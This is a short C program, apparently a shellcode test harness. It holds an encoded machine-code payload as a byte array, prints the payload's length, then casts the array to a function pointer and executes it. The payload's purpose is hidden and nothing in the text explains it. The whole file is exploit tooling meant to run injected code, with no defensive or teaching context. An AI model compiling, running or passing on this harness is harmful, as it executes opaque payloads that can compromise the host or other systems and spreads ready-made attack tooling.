#include<stdio.h>
#include<string.h>


unsigned char shellcode[] =
"\xb8\x19\x08\xa5\xe6\xda\xc6\xd9\x74\x24\xf4\x5e\x2b\xc9\xb1"
"\x13\x31\x46\x13\x83\xee\xfc\x03\x46\x16\xea\x50\x0d\x1e\x52"
"\x9f\xd2\x5e\xa2\xfb\xe3\x97\x6f\x7b\x8a\xe4\xc8\x7f\x8d\xea"
"\x28\x09\x6a\x63\xd1\xb3\x75\x63\x22\xc4\xb8\x03\xab\x06\xfa"
"\x07\xac\x86\xfb\xbc\xae\x86\xfb\xc2\x63\x06\x43\xc3\x7b\x07"
"\xb4\x78\x7b\x07\xb4\x7e\xb1\x87\x5c\xbb\xb6\x77\x63\x6c\x2c"
"\xfc\xff\x5d\xde\x9d\x8c\xd2\x69\x3a\x73";

main()
{

	printf("Shellcode length:  %d\n", strlen(shellcode));
	int (*ret)() = (int(*)())shellcode;

	ret();

}

	
